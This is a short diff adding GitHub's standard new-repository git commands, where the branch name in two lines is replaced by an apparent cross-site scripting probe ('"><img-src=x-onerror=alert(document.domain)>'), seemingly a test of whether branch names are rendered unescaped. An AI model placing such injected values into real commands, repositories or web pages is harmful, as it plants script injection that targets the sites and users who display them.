@@ -1,0 +1,7 @@
+echo "# jhgghjoooo" >> README.md
+git init
+git add README.md
+git commit -m "first commit"
+git branch -M "><img-src=x-onerror=alert(document.domain)>
+git remote add origin https://github.com/Cabbarcan/jhgghjoooo.git
+git push -u origin "><img-src=x-onerror=alert(document.domain)>
